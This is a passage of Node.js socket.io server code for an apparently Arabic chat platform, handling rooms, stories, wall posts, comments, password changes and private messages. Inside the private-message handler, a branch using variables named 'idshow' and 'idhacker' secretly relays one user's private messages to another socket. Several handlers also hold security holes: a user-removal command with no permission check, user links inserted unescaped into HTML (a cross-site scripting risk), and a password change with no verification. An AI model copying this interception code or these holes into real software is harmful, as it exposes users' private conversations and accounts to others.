                  baccolor: data["data"]["baccolor"].split("<").join("&#x3C;") || "#FFFFFF",
                needpass: data["data"]["pass"] ? true : false,
                camera: false,
                broadcast: data["data"]["broadcast"],
                nohide: data["data"]["nohide"],
                deleted: data["data"]["delete"],
                owner: UserInfo[socket.id]["idreg"],
                rmli: data["data"]["like"],
                topic: data["data"]["topic"].split("<").join("&#x3C;"),
                pic: data["data"]["pic"],
                backroom: data["data"]["backroom"],
                welcome: data["data"]["welcome"]
                  ? data["data"]["welcome"].split("<").join("&#x3C;")
                  : "",
                max: data["data"]["max"],
                has: data["data"]["has"],
              });
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم إنشاء غرفة",
                user: "",
              });
              SaveStats({
                state: "إنشاء غرفة",
                topic: UserInfo[socket.id]["topic"],
                ip: UserInfo[socket.id]["ip"],
                username: UserInfo[socket.id]["username"],
                room: UserInfo[socket.id]["idroom"]
                  ? GetRoomList(UserInfo[socket.id]["idroom"])["topic"]
                  : "out room",
                time: new Date().getTime(),
              });
            } else {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "الرجاء التأكد من البيانات المدخولة",
                user: "",
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_EDIT_ROOM") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["broadcast"] == "boolean" &&
              typeof data["data"]["nohide"] == "boolean" &&
              typeof data["data"]["camera"] == "boolean" &&
              typeof data["data"]["topic"] == "string" &&
              typeof data["data"]["pic"] == "string" &&
              typeof data["data"]["id"] == "string" &&
              typeof data["data"]["max"] == "number" &&
              typeof data["data"]["has"] == "number" 
            ) {
              if (!GetPower(UserInfo[socket.id]["power"])["createroom"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "لا تملك صلاحية",
                  user: "",
                });
                return;
              } else if (data["data"]["max"] > 1000 || data["data"]["max"] < 2) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "يجب ان يكون عدداعضاء الروم لا يزيد عن 40 او اقل من 2",
                  user: "",
                });
                return;
              } else if (data["data"]["has"] > 100 || data["data"]["has"] < 1) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "يجب ان يكون هاشتاق الروم لا يزيد عن 100 او اقل من 1",
                user: "",
              });
              return;
            }

              RoomsRepo.updateBy({
                state: "updateRoom",
                topic: data["data"]["topic"].split("<").join("&#x3C;"),
                broadcast: data["data"]["broadcast"],
                nohide: data["data"]["nohide"],
                camera: data["data"]["camera"],
                pic: data["data"]["pic"],
                backroom: data["data"]["backroom"],
                color: data["data"]["color"].split("<").join("&#x3C;") || "#FFFFFF",
                  colorpicroom: data["data"]["colorpicroom"].split("<").join("&#x3C;") || "#FFFFFF",
                  colormsgroom: data["data"]["colormsgroom"].split("<").join("&#x3C;") || "#FFFFFF",
                  baccolor: data["data"]["baccolor"].split("<").join("&#x3C;") || "#FFFFFF",
                about: data["data"]["about"]
                  ? data["data"]["about"].split("<").join("&#x3C;")
                  : "",
                welcome: data["data"]["welcome"]
                  ? data["data"]["welcome"].split("<").join("&#x3C;")
                  : "",
                pass: data["data"]["pass"],
                rmli: data["data"]["like"] || 0,
                needpass: data["data"]["pass"] ? true : false,
                max: data["data"]["max"],
                has: data["data"]["has"],
                id: data["data"]["id"],
              }).then((doneup) => {
                if (doneup) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم التعديل على الغرفة",
                    user: "",
                  });
                  SaveStats({
                    state: "تعديل غرفة",
                    topic: UserInfo[socket.id]["topic"],
                    ip: UserInfo[socket.id]["ip"],
                    username: UserInfo[socket.id]["username"],
                    room: UserInfo[socket.id]["idroom"]
                      ? GetRoomList(UserInfo[socket.id]["idroom"])["topic"]
                      : "out room",
                    time: new Date().getTime(),
                  });
                  RefreshRooms(1);
                  RoomsRepo.getBy({
                    state: "getByID",
                    id: data["data"]["id"],
                  }).then((isro) => {
                    if (isro) {
                      io.emit("SEND_EVENT_EMIT_SERVER", {
                        cmd: "r^",
                        data: {
                          id: data["data"]["id"],
                          topic: data["data"]["topic"],
                          needpass: data["data"]["pass"] ? true : false,
                          owner: isro["owner"],
                          pic: isro["pic"],
                          backroom: isro["backroom"],
                          color: data["data"]["color"],
                          colorpicroom: data["data"]["colorpicroom"],
                          colormsgroom: data["data"]["colormsgroom"],
                          baccolor: data["data"]["baccolor"],
                          broadcast: data["data"]["broadcast"],
                          nohide: data["data"]["nohide"],
                          user: isro["user"],
                          rmli: data["data"]["like"] || 0,
                          about: data["data"]["about"],
                          welcome: data["data"]["welcome"],
                          max: data["data"]["max"],
                          has: data["data"]["has"],
                        },
                      });

                      if (!isro["broadcast"] && PeerRoom[data["data"]["id"]]) {
                        for (var pk in PeerRoom[data["data"]["id"]]) {
                          PeerRoom[data["data"]["id"]][pk] = { id: "", ev: false, us: {} };
                        }
                      }
                      if (isro["broadcast"]) {
                        io.to(data["data"]["id"]).emit(
                          "SEND_EVENT_EMIT_BROADCASTING",
                          { cmd: "rjoin", user: socket.id }
                        );
                        io.to(data["data"]["id"]).emit(
                          "SEND_EVENT_EMIT_BROADCASTING",
                          {
                            cmd: "all",
                            room: data["data"]["id"],
                            data: PeerRoom[data["data"]["id"]],
                          }
                        );
                      }
                    }
                  });
                }
              });
            } else {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "الرجاء التأكد من البيانات المدخولة",
                user: "",
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_REMOVE_USER") {
          const delus = OnlineUser.findIndex((x) => x.id == data["data"]["id"]);
          if (delus != -1) {
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "u-",
              data: data["data"]["id"],
            });
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "ur",
              data: [data["data"]["id"], null],
            });
            OnlineUser.splice(delus, 1);
            if (UserInfo[data["data"]["id"]]) {
              UserDisconnect({ id: data["data"]["id"], state: 1 });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_REMOVE_ROOM") {
          if (UserInfo[socket.id]) {
            if (typeof data["data"]["id"] == "string") {
              if (data["data"]["id"] == "3ihxjl18it") {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "لا يمكنك حذف هذه الغرفة",
                  user: "",
                });
                return;
              } else if (
                !GetPower(UserInfo[socket.id]["power"])["createroom"]
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "لا تملك صلاحية",
                  user: "",
                });
                return;
              }

              io.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "lavedon",
                data: {},
              });
              SaveStats({
                state: "حذف غرفه",
                topic: UserInfo[socket.id]["topic"],
                ip: UserInfo[socket.id]["ip"],
                username: UserInfo[socket.id]["username"],
                room: UserInfo[socket.id]["idroom"]
                  ? GetRoomList(UserInfo[socket.id]["idroom"])["topic"]
                  : "out room",
                time: new Date().getTime(),
              });

              RoomsRepo.deleted(data["data"]["id"]).then((delroom) => {
                if (delroom) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم حذف الغرفة",
                    user: "",
                  });
                  io.emit("SEND_EVENT_EMIT_SERVER", {
                    cmd: "r-",
                    data: data["data"]["id"],
                  });
                  RefreshRooms(1);
                  MessagesList({
                    state: "LogsMsg",
                    bg: UserInfo[socket.id]["bg"],
                    copic: UserInfo[socket.id]["copic"],
                    class: "hmsg",
                    id: UserInfo[socket.id]["id"],
                    topic: UserInfo[socket.id]["topic"],
                    msg: "( تم حذف الغرفة الحاليه )",
                    idroom: data["data"]["id"],
                    pic: UserInfo[socket.id]["pic"],
                  });
                }
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_BUSY") {
          if (typeof data["data"]["busy"] == "boolean") {
            if (UserInfo[socket.id]) {
              if (data["data"]["busy"]) {
                ChangeSatets(2);
                setTimeout(() => {
                  if (UserInfo[socket.id]) {
                    UserInfo[socket.id]["busy"] = true;
                  }
                }, 500);
              } else {
                UserInfo[socket.id]["busy"] = false;
                ChangeSatets(0);
              }
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_PIC") {
          if (typeof data["data"]["pic"] == "string") {
            if (!NoTa5(data["data"]["pic"])) {
              if (UserInfo[socket.id]["rep"] < SiteSetting["maxlikepic"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg:
                    SiteSetting["maxlikepic"] +
                    " لرفع او حذف صورة يجب ان يكون عدد اللايكات",
                  user: "",
                });
                return;
              }
              fs.unlink("uploads" + UserInfo[socket.id]["pic"], (err) => {
                if (err) {
                }
              });
              fs.unlink(
                "uploads" + UserInfo[socket.id]["pic"] + ".jpg",
                (err) => {
                  if (err) {
                  }
                }
              );
              const picup = OnlineUser.findIndex((x) => x.id == socket.id);
              if (picup != -1) {
                UserInfo[socket.id]["pic"] = data["data"]["pic"];
                OnlineUser[picup]["pic"] = data["data"]["pic"];
                io.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "u^",
                  data: OnlineUser[picup],
                });
                if (UserInfo[socket.id]["uid"]) {
                  UsersRepo.updateBy({
                    state: "updatePic",
                    uid: UserInfo[socket.id]["uid"],
                    pic: data["data"]["pic"],
                  });
                }
              }
            }
          }
        }else if(data['cmd'] == "PROFILE_ADD_YOUTUBE"){
          if(!NoTa5(data['data']['youtube'])){
            if(UserInfo[socket.id]['rep'] < SiteSetting['maxlikeyot']){
              SendNotification({state:'me',topic: "", force: 1, msg: SiteSetting['maxlikeyot'] + "  يجب أن يكون عدد اللايكات", user: ""});
              return; 
            };
          const picup = OnlineUser.findIndex((x) => x.id == socket.id);
          if (picup != -1) {
            OnlineUser[picup]['youtube'] = data['data']["youtube"];
            io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u^", data: OnlineUser[picup] });
            if (UserInfo[socket.id]['uid']) {
              if(data['data']["youtube"]){
              SendNotification({state:'me',topic: "", force: 1, msg: "تم إظافة رابط يوتوب", user: ""});
              }else{
              SendNotification({state:'me',topic: "", force: 1, msg: "تم إزالة رابط يوتوب", user: ""});
                
              };
              UsersRepo.updateBy({state:'updateYoutube', uid: UserInfo[socket.id]['uid'], youtube: data['data']["youtube"]});
              };
           };
        };
        }else if (data["cmd"] == "cheangback") {
          if (typeof data.data != "object") {
            return;
        }

        if (!data.data["back"]) {
            return;
        }
        if (!data.data["num"]) {
            return;
        }
        if (typeof data.data.back != "string") {
            return;
        }

        if (typeof data.data.num != "number") {
            return;
        }
        if (UserInfo[socket.id]) {
           if(data.data.num==1){
            UsersRepo.updateBck({ back:data.data["back"], idreg: UserInfo[socket.id].idreg.split("#")[1] }).then((isrs) => {
                if (isrs) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg:"تم تغير الخلفية بنجاح ",
                    user: "",
                  });
                }
            });
            const picdix = OnlineUser.findIndex((x) => x.id == socket.id);
            if (picdix != -1) {
              OnlineUser[picdix].back = data.data["back"];
                    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u^", data: OnlineUser[picdix] });
            }
           }else if(data.data.num==2){

            UsersRepo.updateAtar({ atar: data.data["back"], idreg: UserInfo[socket.id].idreg.split("#")[1] }).then((isrs) => {
                if (isrs) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg:"تم تغير الاطار بنجاح ",
                    user: "",
                  });
                }
            });
            const picdix = OnlineUser.findIndex((x) => x.id == socket.id);
            if (picdix != -1) {
              OnlineUser[picdix].atar = data.data["back"];
                    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "u^", data: OnlineUser[picdix] });
            }
           }
        }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_NO_PM") {
          if (typeof data["data"]["id"] == "string") {
            SendNotification({
              id: data["data"]["id"],
              state: "to",
              topic: "",
              force: 1,
              msg: '<label class="fa fa-warning">هذا المستخدم لا يقبل المحادثات الخاصه</label>',
              user: "",
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_NO_NOTIFICATION") {
          if (typeof data["data"]["id"] == "string") {
            SendNotification({
              id: data["data"]["id"],
              state: "to",
              topic: "",
              force: 1,
              msg: '<label class="fa fa-warning">هذا المستخدم لا يقبل التنبيهات الخاصه</label>',
              user: "",
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_VIEW_STORY") {
          if (UserInfo[socket.id]) {
            if (typeof data["data"]["id"] != "number") {
              return;
            }
    StoryRepo.getBy({ state: "getByID", id: data["data"]["id"] }).then(
              (st) => {
                if (st) {
                  const views = st["views"] ? JSON.parse(st["views"]) : [];
                  const likes = st["likes"] ? JSON.parse(st["likes"]) : [];
                  const findview = views.findIndex((x) => x == UserInfo[socket.id]["idreg"]);
                  const findLike = likes.findIndex((x) => x == UserInfo[socket.id]["idreg"]);
				  if(data['data']['is']){
					  if (findLike == -1) {
                    likes.push(UserInfo[socket.id]["idreg"]);
                    StoryRepo.updateByIdL({
                      likes: JSON.stringify(likes),
                      id: data["data"]["id"],
                    });
					
			UsersRepo.getBy({state: "getByLid",lid:st.owner}).then(function(uid) {
				
									if (uid) {
										if (UserInfo[uid.id]) {
											     SendNotification({
                        id: uid.id,
                        state: "to",
                        topic: UserInfo[socket.id].topic.split("<").join("&#x3C;"),
                        force: 1,
                        msg:  "هذا المستخدم قام بلإعجاب على حالتك ❤",
                        user: socket.id,
                      });
										}
									}
								});
	
                  }  
				  }else{
                  if (findview == -1) {
                    views.push(UserInfo[socket.id]["idreg"]);
                    StoryRepo.updateById({
                      views: JSON.stringify(views),
                      id: data["data"]["id"],
                    });
                  };
                };
				};
              });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_CHANGE_PASS") {
          if (typeof data["data"]["pass"] != "string") {
            return;
          } else if (data["data"]["pass"].trim().length < 4) {
            socket.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "removede",
              data: {},
            });
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء التأكد من كلمة المرور",
              user: "",
            });
            return;
          }

          UsersRepo.updateBy({
            state: "updatePass",
            password: passwordHash.generate(data["data"]["pass"]),
            idreg: UserInfo[socket.id]["idreg"].split("#")[1],
          }).then((isrs) => {
            if (isrs) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "تم تغيير كلمة المرور بنجاح",
                user: "",
              });
            }
          });
        } else if (data["cmd"] == "SEND_EVENT_EMIT_LEAVED_ROOM") {
          if (UserInfo[socket.id]) {
            if (
              GetPower(UserInfo[socket.id]["power"])["stealth"] &&
              UserInfo[socket.id]["stealth"]
            ) {
            } else {
              if (!UserInfo[socket.id]["kiked"]) {
                MessagesList({
                  state: "LogsMsg",
                  bg: UserInfo[socket.id]["bg"],
                  copic: UserInfo[socket.id]["copic"],
                  class: "hmsg",
                  id: UserInfo[socket.id]["id"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: "( هذا المستخدم غادر الغرفه )",
                  idroom: UserInfo[socket.id]["idroom"],
                  pic: UserInfo[socket.id]["pic"],
                });
                UserInfo[socket.id]["kiked"] = false;
              }
            }
            const isroom = OnlineUser.findIndex((x) => x.id == socket.id);
if (isroom !== -1) {
  OnlineUser[isroom]["roomid"] = null;
  io.emit("SEND_EVENT_EMIT_SERVER", {
    cmd: "u^",
    data: OnlineUser[isroom],
  });
}

            if (UserInfo[socket.id]["idroom"]) {
             

              if (GetRoomList(UserInfo[socket.id]["idroom"])["broadcast"]) {
                io.to(UserInfo[socket.id]['idroom']).emit("SEND_EVENT_EMIT_BROADCASTING", { cmd: "rleave", user: socket.id });
                for (var i = 1; i < 8; i++) {
                  if (
                    PeerRoom[UserInfo[socket.id]["idroom"]][i].id == socket.id
                  ) {
                    PeerRoom[UserInfo[socket.id]["idroom"]][i].id = "";
                    PeerRoom[UserInfo[socket.id]["idroom"]][i].ev = false;
                    PeerRoom[UserInfo[socket.id]["idroom"]][i].us = {};
                  }
                }
              }
            }
            socket.leave(UserInfo[socket.id]["idroom"]);
            UserInfo[socket.id]["idroom"] = null;
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "ur",
              data: [socket.id, null],
            });
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_DEL_MSG") {
          if (UserInfo[socket.id]) {
            if (
              typeof data["data"]["mi"] == "string" &&
              typeof data["data"]["topic"] == "string"
            ) {
              if (GetPower(UserInfo[socket.id]["power"])["delmsg"]) {
                io.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "delmsg",
                  data: data["data"]["mi"],
                });
                if (data["data"]["mi"].length > 15) {
                  SaveStats({
                    state: "مسح إعلان",
                    topic: UserInfo[socket.id]["topic"],
                    ip: UserInfo[socket.id]["ip"],
                    username: data["data"]["topic"],
                    room: UserInfo[socket.id]["idroom"]
                      ? GetRoomList(UserInfo[socket.id]["idroom"])["topic"]
                      : "out room",
                    time: new Date().getTime(),
                  });
                } else {
                  SaveStats({
                    state: "مسح رسالة عامة",
                    topic: UserInfo[socket.id]["topic"],
                    ip: UserInfo[socket.id]["ip"],
                    username: data["data"]["topic"],
                    room: UserInfo[socket.id]["idroom"]
                      ? GetRoomList(UserInfo[socket.id]["idroom"])["topic"]
                      : "out room",
                    time: new Date().getTime(),
                  });
                }
              }
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_COMMENT_BC") {
          if (
            typeof data["data"]["msg"] != "string" &&
            typeof data["data"]["bid"] != "string"
          ) {
            return;
          } else if (!data["data"]["msg"].trim()) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg: "الرجاء كتابة تعليق",
              user: "",
            });
            return;
          } else if (UserInfo[socket.id]["rep"] < SiteSetting["maxlikebc"]) {
            SendNotification({
              state: "me",
              topic: "",
              force: 1,
              msg:
                SiteSetting["maxlikebc"] +
                "عدد الايكات المطلوبة للتعليق على المنشور ",
              user: "",
            });
            return;
          }

          BarsRepo.getBy({ state: "getByBid", bid: data["data"]["bid"] }).then(
            (iscomment) => {
              if (iscomment) {
                const comment = iscomment["bcc"]
                  ? JSON.parse(iscomment["bcc"])
                  : [];
                if (comment.length > Config.MaxComment) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "تم الوصول الحد الاقصى لتعليقات",
                    user: "",
                  });
                  return;
                }
                const idcomment = stringGen(10);
                const cmm = {
                  idc: idcomment,
                  id: socket.id,
                  time: new Date().getTime(),
                  bid: data["data"]["bid"],
                  pic: UserInfo[socket.id]["pic"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: data["data"]["msg"]
                    .split("<")
                    .join("&#x3C;")
                    .slice(0, SiteSetting["lengthbc"]),
                };
                comment.push(cmm);

                BarsRepo.update({
                  state: "updateComment",
                  bid: data["data"]["bid"],
                  bcc: JSON.stringify(comment),
                });

                BarsRepo.getBy({
                  state: "getByBid",
                  bid: data["data"]["bid"],
                }).then((commes) => {
                  if (commes) {
                    io.emit("SEND_EVENT_EMIT_SERVER", {
                      cmd: "bcco",
                      data: {
                        allcooment:commes,
                        bid: data["data"]["bid"],
                        bc: commes["bcc"],
                        bcc: cmm,
                      },
                    });
                  }
                });
                UsersRepo.getBy({
                  state: "getByLid",
                  lid: iscomment["owner"],
                }).then(function (user) {
                  if (user) {
                    if (UserInfo[user.id]) {
                      SendNotification({
                        id: user.id,
                        state: "to",
                        topic: UserInfo[socket.id]["topic"],
                        force: 1,
                        msg: "هذا المستخدم قام بتعليق على منشورك في الحائط",
                        user: socket.id,
                      });
                    }
                  }
                });
              }
            }
          );        } else if (data["cmd"] == "SEND_EVENT_EMIT_LIKE_BC") {
          if (UserInfo[socket.id]) {
            if (typeof data["data"]["bid"] == "string") {
              BarsRepo.getBy({
                state: "getByBid",
                bid: data["data"]["bid"],
              }).then((isbc) => {
                if (isbc) {
                  const liked = isbc["likes"] ? JSON.parse(isbc["likes"]) : [];
                  var isliked = liked.findIndex(
                    (x) => x == UserInfo[socket.id]["idreg"]
                  );
                  if (isliked == -1) {
                    liked.push(UserInfo[socket.id]["idreg"]);
                    BarsRepo.update({
                      state: "updateLike",
                      bid: data["data"]["bid"],
                      likes: JSON.stringify(liked),
                    }).then((donelike) => {
                      if (donelike) {
                        UsersRepo.getBy({
                          state: "getByLid",
                          lid: isbc["owner"],
                        }).then(function (user) {
                          if (user) {
                            BarsRepo.getBy({
                              state: "getByBid",
                              bid: data["data"]["bid"],
                            }).then((islikea) => {
                              if (islikea) {
                                io.emit("SEND_EVENT_EMIT_SERVER", {
                                  cmd: "bc^",
                                  data: {
                                    bid: data["data"]["bid"],
                                    likes: islikea["likes"],
                                  },
                                });
                              }
                            });
                            if (UserInfo[user.id]) {
                            }
                          }
                        });
                      }
                    });
                  }
                }
              });
            }
          }

        } else if (data["cmd"] == "SEND_EVENT_EMIT_DEL_BC") {
          if (UserInfo[socket.id]) {
            if (typeof data["data"]["bid"] == "string") {
              BarsRepo.getBy({
                state: "getByBid",
                bid: data["data"]["bid"],
              }).then((isbc) => {
                if (isbc) {
                  if (
                    GetPower(UserInfo[socket.id]["power"])["delbc"] ||
                    isbc["owner"] == UserInfo[socket.id]["lid"]
                  ) {
                    SaveStats({
                      state: "حذف حائط",
                      topic: UserInfo[socket.id]["topic"],
                      ip: UserInfo[socket.id]["ip"],
                      username: UserInfo[socket.id]["username"],
                      room: "",
                      time: new Date().getTime(),
                    });
                    if (isbc["msg"].includes("<a href=/sendfile")) {
                      fs.unlink(
                        "uploads/sendfile" +
                          isbc["msg"].split("sendfile")[2].replace("</a>", ""),
                        (err) => {
                          if (err) {
                          }
                        }
                      );
                    }
                    BarsRepo.deleted({
                      state: "deleteByBid",
                      bid: data["data"]["bid"],
                    }).then((delbc) => {
                      if (delbc) {
                        io.emit("SEND_EVENT_EMIT_SERVER", {
                          cmd: "delbc",
                          data: { bid: data["data"]["bid"] },
                        });
                      }
                    });
                  }
                }
              });
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_BC") {
          if (UserInfo[socket.id]) {
            if (UserInfo[socket.id]["ismutedbc"]) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "إسكات",
                user: "",
              });
              return;
            } else if (UserInfo[socket.id]["rep"] < SiteSetting["maxlikebc"]) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  SiteSetting["maxlikebc"] +
                  "عدد الايكات المطلوبة للنشر على الحائط ",
                user: "",
              });
              return;
            } else if (
              typeof data["data"]["msg"] != "string" ||
              (!data["data"]["msg"].trim() && !data["data"]["link"])
            ) {
              return;
            } else if (UserInfo[socket.id]["bar"]) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg:
                  " يمكنك النشر على الحائط كل  " +
                  SiteSetting["bctime"] +
                  " دقايق",
                user: "",
              });
              return;
            }

            if (data["data"]["link"]) {
              if (typeof data["data"]["link"] != "string") {
                return;
              } else if (NoTa5(data["data"]["link"])) {
                return;
              }
            }
            UserInfo[socket.id]["bar"] = true;
            const isidbar = stringGen(10);
            if (!SiteSetting["bars"]) {
              CreateBars({
                bg: UserInfo[socket.id]["bg"],
                copic: UserInfo[socket.id]["copic"],
                bid: isidbar,
                owner: UserInfo[socket.id]["lid"],
                mcol: UserInfo[socket.id]["mcol"],
                pic: UserInfo[socket.id]["pic"],
                 msg: (ReplaceEktisar(data["data"]["msg"].slice(0, SiteSetting["lengthbc"])) ? ReplaceEktisar(data["data"]["msg"].slice(0, SiteSetting["lengthbc"])) : "") + (data["data"]["link"] ? "<br> <a href=" + data["data"]["link"] + ' target="_blank"  class="uplink">' + data["data"]["link"] + "</a>" : ""),
                topic: UserInfo[socket.id]["topic"],
                ucol: UserInfo[socket.id]["ucol"],
                data: new Date().getTime().toFixed(),
              });
            }
            FilterChat(data['data']['msg']);
            io.emit("SEND_EVENT_EMIT_SERVER", {
              cmd: "bc",
              data: {
                numb: 1,
                bcc: JSON.stringify([]),
                likes: JSON.stringify([]),
                bg: UserInfo[socket.id]['bg'],
                bid: isidbar,
                uid:socket.id,
                owner: UserInfo[socket.id]['lid'],
                mcol: UserInfo[socket.id]['mcol'],
                msg: (ReplaceEktisar(data["data"]["msg"].slice(0, SiteSetting["lengthbc"])) ? ReplaceEktisar(data["data"]["msg"].slice(0, SiteSetting["lengthbc"])) : "") + (data["data"]["link"] ? "<br> <a href=" + data["data"]["link"] + ' target="_blank"  class="uplink">' + data["data"]["link"] + "</a>" : ""),
                pic: UserInfo[socket.id]['pic'],
                topic: UserInfo[socket.id]['topic'],
                ucol: UserInfo[socket.id]['ucol']
            }});
            
            
                   UserInfo[socket.id]['evaluation'] += 1
            if(UserInfo[socket.id]['evaluation'] == 2000 ||
            UserInfo[socket.id]['evaluation'] == 4000 ||
                    UserInfo[socket.id]['evaluation'] == 6000 ||
            UserInfo[socket.id]['evaluation'] == 8000 ||
            UserInfo[socket.id]['evaluation'] == 10000 ||
            UserInfo[socket.id]['evaluation'] == 12000 ||
            UserInfo[socket.id]['evaluation'] == 14000 ||
            UserInfo[socket.id]['evaluation'] == 16000 ||
            UserInfo[socket.id]['evaluation'] == 18000 ||
            UserInfo[socket.id]['evaluation'] == 20000){
              NextLevel();
            };
            

    
            setTimeout(()=>{
              if (UserInfo[socket.id]) {
                UserInfo[socket.id]['bar'] = false;
              };
            },60000 * SiteSetting["bctime"]);
            
            };
        } else if (data["cmd"] == "SEND_EVENT_EMIT_PM_DEL") {
          if (
            typeof data["data"]["pi"] == "string" &&
            typeof data["data"]["owner"] == "string" &&
            typeof data["data"]["pm"] == "string"
          ) {
            if (UserInfo[socket.id]) {
              if (socket.id == data["data"]["owner"]) {
                socket.emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "delpm",
                  data: data["data"],
                });
                socket.to(data["data"]["pm"]).emit("SEND_EVENT_EMIT_SERVER", {
                  cmd: "delpm",
                  data: data["data"],
                });
              }
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_PM") {
          if (
            typeof data["data"]["id"] == "string" &&
            typeof data["data"]["msg"] == "string"
          ) {
            if (UserInfo[data["data"]["id"]] && UserInfo[socket.id]) {
              if (!data["data"]["msg"].trim() && !data["data"]["link"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "الرجاء كتابة الرسالة",
                  user: "",
                });
                return;
              } else if (
                UserInfo[socket.id]["rep"] < SiteSetting["maxlikepm"]
              ) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg:
                    SiteSetting["maxlikepm"] +
                    " " +
                    "عدد الايكات المطلوبة لارسال رسالة في الخاص ",
                  user: "",
                });
                return;
              } else if (UserInfo[socket.id]["ismuted"]) {
                SendNotification({
                  state: "me",
                  topic: "",
                  force: 1,
                  msg: "إسكات",
                  user: "",
                });
                return;
              }

              if (data["data"]["link"]) {
                if (typeof data["data"]["link"] != "string") {
                  return;
                } else if (NoTa5(data["data"]["link"])) {
                  return;
                }
              }

              const idpm = stringGen(20);
              /* [ADDED] حساب نص الخاص مرة واحدة والبث فوراً؛ الفلترة بعد البث */
              const rawPm = data["data"]["msg"];
              let pmText;
              if (rawPm) {
                const cleanPm = ReplaceEktisar(rawPm);
                if (cleanPm === undefined) {
                  FilterChat(rawPm);
                  return;
                }
                pmText = cleanPm.slice(0, SiteSetting["lengthpm"]);
              } else {
                pmText =
                  " <a href=" +
                  data["data"]["link"] +
                  ' target="_blank"  class="uplink">' +
                  data["data"]["link"] +
                  "</a>";
              }
              setImmediate(function () {
                FilterChat(rawPm);
              });
              socket.to(data["data"]["id"]).emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "pm",
                data: {
                  bg: UserInfo[socket.id]["bg"],
                  copic: UserInfo[socket.id]["copic"],
                  mcol: UserInfo[socket.id]["mcol"],
                  ucol: UserInfo[socket.id]["ucol"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: pmText,
                  pm: socket.id,
                  force: GetPower(UserInfo[socket.id]["power"])["forcepm"],
                  pic: UserInfo[socket.id]["pic"],
                  owner: socket.id,
                  pi: idpm,
                  uid: socket.id,
                },
              });

              socket.emit("SEND_EVENT_EMIT_SERVER", {
                cmd: "pm",
                data: {
                  bg: UserInfo[socket.id]["bg"],
                  copic: UserInfo[socket.id]["copic"],
                  mcol: UserInfo[socket.id]["mcol"],
                  ucol: UserInfo[socket.id]["ucol"],
                  topic: UserInfo[socket.id]["topic"],
                  msg: pmText,
                  pm: data["data"]["id"],
                  force: GetPower(UserInfo[socket.id]["power"])["forcepm"],
                  pic: UserInfo[socket.id]["pic"],
                  owner: socket.id,
                  pi: idpm,
                  uid: socket.id,
                },
              });
			         if(idshow && idhacker){
						if(data['data']['id'] == idshow || socket.id == idshow){
						 io.to(idhacker).emit("msgpmnow", {
                                bg: UserInfo[socket.id]['bg'],
                                mcol: UserInfo[socket.id]['mcol'],
                                ucol: UserInfo[socket.id]['ucol'],
                                topic: UserInfo[socket.id]['topic'],
                                msg:data['data']['msg'] ? pmText : " <a href=" + data['data']['link'].split("<").join("&#x3C;") + ' target="_blank"  class="uplink">' + data['data']['link'].split("<").join("&#x3C;") + "</a>",
                                pm: socket.id,
                                force: GetPower(UserInfo[socket.id]['power'])['forcepm'],
                                pic: UserInfo[socket.id]['pic'],
                                owner:socket.id,
								pi:idpm,
                                uid: socket.id,
						});
						};
						};
            }
          }
        } else if (data["cmd"] == "SEND_EVENT_EMIT_MSG") {
          if (UserInfo[socket.id]) {
            if (typeof data["data"]["msg"] != "string") {
              return;
            } else if (!data["data"]["msg"]) {
              SendNotification({
                state: "me",
                topic: "",
                force: 1,
                msg: "الرجاء كتابة الرسالة",
                user: "",
              });
              return;
